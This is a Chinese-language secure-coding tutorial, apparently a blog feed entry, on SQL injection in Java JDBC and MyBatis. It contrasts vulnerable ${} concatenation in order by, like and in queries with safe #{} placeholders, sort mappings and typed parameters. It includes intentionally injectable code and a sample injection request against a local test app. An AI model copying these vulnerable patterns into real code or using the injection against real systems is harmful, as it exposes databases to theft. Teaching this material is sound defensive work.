<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 如果参数类型为boolean,byte,short,int,long,float,double等，sql语句无法拼接字符串，因此不存在注入</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Map<span style="color:#f92672">&lt;</span>String, Object<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">safe4</span>(Integer id) {
</span></span><span style="display:flex;"><span>    String sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select * from users where id = &#34;</span> <span style="color:#f92672">+</span> id;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jdbctemplate.<span style="color:#a6e22e">queryForMap</span>(sql);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="总结">总结</h3>
<p>-jdbc
出现SQL注入的条件是</p>
<p>1、采用Statement方法拼接SQL语句</p>
<p>2、PrepareStatement会对SQL语句进行预编译，但如果直接采取拼接的方式构造SQL，此时进行预编译也无用。</p>
<p>3、JDBCTemplate是Spring对JDBC的封装，如果使用拼接语句便会产生注入</p>
<p>安全写法：SQL语句占位符（?） + PrepareStatement预编译</p>
<h2 id="mybatis-1">Mybatis</h2>
<p>MyBatis框架底层已经实现了对SQL注入的防御，但存在使用不当的情况下，仍然存在SQL注入的风险。</p>
<p>MyBatis支持两种参数符号，一种是#，另一种是$，#使用预编译，$使用拼接SQL。</p>
<p>这里的问题主要是使用#{}的问题,使用#{}之后,传进来的参数会被转成带双引号的字符串,导致sql语句错误,开发偷懒就使用了${}进行拼接处理.</p>
<h3 id="order-by-注入">order by 注入</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 由于使用#{}会将对象转成字符串，形成order by &#34;user&#34; desc造成错误，因此很多研发会采用${}来解决，从而造成SQL注入</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@GetMapping</span>(<span style="color:#e6db74">&#34;/vul/order&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> List<span style="color:#f92672">&lt;</span>User<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">orderBy</span>(String field, String sort) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> userMapper.<span style="color:#a6e22e">orderBy</span>(field, sort);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// xml方式</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>select id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;orderBy&#34;</span> resultType<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;com.best.hello.entity.User&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    select <span style="color:#f92672">*</span> from users order by ${field} ${sort}
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>select<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 注解方式</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@Select</span>(<span style="color:#e6db74">&#34;select * from users order by ${field} desc&#34;</span>)
</span></span><span style="display:flex;"><span>List<span style="color:#f92672">&lt;</span>User<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">orderBy2</span>(<span style="color:#a6e22e">@Param</span>(<span style="color:#e6db74">&#34;field&#34;</span>) String field);
</span></span><span style="display:flex;"><span>                    
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://127.0.0.1:8888/SQLI/MyBatis/vul/order?field<span style="color:#f92672">=</span>id&amp;sort<span style="color:#f92672">=</span>desc,1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;id&#34;</span>:2,<span style="color:#e6db74">&#34;user&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;pass&#34;</span>:<span style="color:#e6db74">&#34;password&#34;</span><span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;id&#34;</span>:1,<span style="color:#e6db74">&#34;user&#34;</span>:<span style="color:#e6db74">&#34;zhangwei&#34;</span>,<span style="color:#e6db74">&#34;pass&#34;</span>:<span style="color:#e6db74">&#34;123456&#34;</span><span style="color:#f92672">}]</span>
</span></span></code></pre></div><h3 id="搜索框注入">搜索框注入</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>// 模糊搜索时，直接使用<span style="color:#e6db74">&#39;%#{q}%&#39;</span> 会报错，部分研发图方便直接改成<span style="color:#e6db74">&#39;%${q}%&#39;</span>从而造成注入
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>@Select<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;select * from users where user like &#39;%</span><span style="color:#e6db74">${</span>q<span style="color:#e6db74">}</span><span style="color:#e6db74">%&#39;&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>List&lt;User&gt; search<span style="color:#f92672">(</span>String q<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>// 安全代码,采用concat
</span></span><span style="display:flex;"><span>@Select<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;select * from users where user like concat(&#39;%&#39;,#{q},&#39;%&#39;)&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>List&lt;User&gt; search<span style="color:#f92672">(</span>String q<span style="color:#f92672">)</span>;
</span></span></code></pre></div><h3 id="in-注入">in 注入</h3>
<p>这里也是使用了${}来进行了拼接,会导致错误</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    @RequestMapping<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/in&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    public String in<span style="color:#f92672">(</span>String ids, Model model<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        try <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>//            List&lt;String&gt; list <span style="color:#f92672">=</span> Arrays.asList<span style="color:#f92672">(</span>ids.split<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;,&#34;</span><span style="color:#f92672">))</span>;
</span></span><span style="display:flex;"><span>//            ArrayList&lt;Admin&gt; adminList <span style="color:#f92672">=</span> injectService.in<span style="color:#f92672">(</span>list<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>            ArrayList&lt;Admin&gt; adminList <span style="color:#f92672">=</span> injectService.in<span style="color:#f92672">(</span>ids<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>            model.addAttribute<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;userInfo&#34;</span>, adminList<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> catch <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            e.printStackTrace<span style="color:#f92672">()</span>;
</span></span><span style="display:flex;"><span>            model.addAttribute<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;results&#34;</span>, e.toString<span style="color:#f92672">())</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;basevul/sqli/mybatis_in&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    //  正确安全写法
</span></span><span style="display:flex;"><span>    //  @Select<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&lt;script&gt;&#34;</span> + <span style="color:#e6db74">&#34;SELECT * FROM users WHERE id IN &#34;</span> + <span style="color:#e6db74">&#34;&lt;foreach item=&#39;item&#39; index=&#39;index&#39; collection=&#39;ids&#39; open=&#39;(&#39; separator=&#39;,&#39; close=&#39;)&#39;&gt;&#34;</span> + <span style="color:#e6db74">&#34;#{item}&#34;</span> + <span style="color:#e6db74">&#34;&lt;/foreach&gt;&#34;</span> + <span style="color:#e6db74">&#34;&lt;/script&gt;&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    //  ArrayList&lt;Admin&gt; in<span style="color:#f92672">(</span>@Param<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ids&#34;</span><span style="color:#f92672">)</span> List&lt;String&gt; ids<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>    @Select<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Select * from users where id in (</span><span style="color:#e6db74">${</span>ids<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    ArrayList&lt;Admin&gt; in<span style="color:#f92672">(</span>@Param<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ids&#34;</span><span style="color:#f92672">)</span> String ids<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><h3 id="使用排序映射">使用排序映射</h3>
<p>安全写法是在xml中使用排序映射</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;select</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;orderBySafe&#34;</span> <span style="color:#a6e22e">resultType=</span><span style="color:#e6db74">&#34;com.best.hello.entity.User&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    select * from users
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;choose&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;when</span> <span style="color:#a6e22e">test=</span><span style="color:#e6db74">&#34;field == &#39;id&#39;&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>            order by id desc
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/when&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;when</span> <span style="color:#a6e22e">test=</span><span style="color:#e6db74">&#34;field == &#39;user&#39;&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>            order by user desc
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/when&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;otherwise&gt;</span>
</span></span><span style="display:flex;"><span>            order by id desc
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/otherwise&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/choose&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/select&gt;</span>
</span></span></code></pre></div><h3 id="使用">使用#</h3>
<p>使用Mybatis作为持久层框架，应通过#{}语法进行参数绑定，MyBatis 会创建 PreparedStatement 参数占位符，并通过占位符安全地设置参数。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 使用 #{} 安全编码</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@Select</span>(<span style="color:#e6db74">&#34;select * from users where user like CONCAT(&#39;%&#39;, #{user}, &#39;%&#39;)&#34;</span>)
</span></span><span style="display:flex;"><span>List<span style="color:#f92672">&lt;</span>User<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">queryByUser</span>(<span style="color:#a6e22e">@Param</span>(<span style="color:#e6db74">&#34;user&#34;</span>) String user);
</span></span></code></pre></div><h3 id="强制参数类型-1">强制参数类型</h3>
<p>安全写法,强制类型</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 使用 ${} 本身是存在注入的，但由于强制使用Integer或long类型导致注入无效（无法注入字符串）</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@Select</span>(<span style="color:#e6db74">&#34;select * from users where id = ${id}&#34;</span>)
</span></span><span style="display:flex;"><span>List<span style="color:#f92672">&lt;</span>User<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">queryById2</span>(<span style="color:#a6e22e">@Param</span>(<span style="color:#e6db74">&#34;id&#34;</span>) Integer id);
</span></span></code></pre></div><h3 id="总结-1">总结</h3>
<p>-MyBatis
MyBatis支持两种参数符号，一种是#，另一种是$，#使用预编译，$使用拼接SQL。</p>
<p>1、order by注入：由于使用#{}会将对象转成字符串，形成order by &ldquo;user&rdquo; desc造成错误，因此很多研发会采用${}来解决，从而造成注入.</p>
<p>2、like 注入：模糊搜索时，直接使用&rsquo;%#{q}%&rsquo; 会报错，部分研发图方便直接改成&rsquo;%${q}%&lsquo;从而造成注入.</p>
<p>3、in注入：in之后多个id查询时使用 # 同样会报错，从而造成注入.</p>
<h1 id="一句话总结">一句话总结</h1>
<p>在写sql语句时使用预编译,并且正确使用占位符,不要直接进行拼接处理</p>
<h1 id="引用">引用</h1>
<p>小迪sec</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/javasec" term="sec/javasec" label="sec/javasec" />
                            
                        
                    
                
            
        </entry>
    
</feed>
